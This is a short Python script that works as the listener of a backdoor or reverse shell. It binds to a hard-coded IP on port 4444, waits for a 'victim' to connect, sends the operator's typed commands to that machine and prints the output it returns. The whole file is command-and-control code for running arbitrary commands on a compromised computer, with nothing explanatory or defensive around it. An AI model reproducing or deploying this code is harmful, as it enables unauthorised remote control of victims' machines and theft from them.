import socket

runmain = True

def main():
    global runmain
    pingtimer = 0
    runmain = False
    my_ip = '26.29.81.249'
    port = 4444
    server = socket.socket()
    server.bind((my_ip, port))
    print('[+] Server Started')
    print('[+] Listening For Victim')
    server.listen(1)
    victim, victim_addr = server.accept()
    print(f'[+] {victim_addr} Victim opened the backdoor')
    connectionest = True
    while connectionest:
        try:
            pingtimer += 1
            print(pingtimer)
            if pingtimer > 1000:
                victim.send("ping".encode())
                pingtimer = 0
                print("ping")
            command = input('Enter Command : ')
            if len(command) < 1:
                print("Command cannot be null")
                command = 'cd'
            if command == 'say' or command == 'python' or command == 'python3':
                print('Command cancelled because the written command breaks connection.')
                command = 'cd'
            command = command.encode()
            print(command)
            victim.send(command)
            print('[+] Command sent')
        except Exception as e:
            print(e)
            if type(e) == BrokenPipeError or type(e) == ConnectionResetError:
                connectionest = False
                runmain = True
        try:
            output = victim.recv(1000000000)
            output = output.decode()
            print(f"Output: {output}")
        except Exception as e:
            print(e)
            print("not working LOL")
            pass
while True:
    if runmain == True:
        main()